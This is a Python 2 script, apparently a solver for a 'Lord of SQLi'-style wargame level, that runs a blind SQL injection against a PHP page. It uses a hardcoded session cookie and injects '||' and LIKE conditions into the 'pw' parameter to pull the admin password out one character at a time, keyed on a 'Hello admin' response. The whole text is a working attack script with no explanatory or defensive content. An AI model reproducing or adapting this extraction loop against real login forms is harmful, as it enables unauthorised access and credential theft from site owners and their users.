import requests

start=ord('0')
end=ord('Z')
value = ""
i = start

url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php"
cookies = {"PHPSESSID":"cf8bml1u8rep03adn37hkqm0v6"}

while 1:
	sql = "\' || (id like \'admin\' && pw like \'"+value+chr(i)+"%\') -- \'"
	params = {'pw':sql}
	r = requests.get(url, params=params, cookies=cookies)
	print sql

	i += 1
	if i == 37:
		i+=1

	if r.text.find("Hello admin") != -1:
		value += chr(i-1)
		i=start
		print "value : "+value
	if i>end:
		break

print "finished : " + value
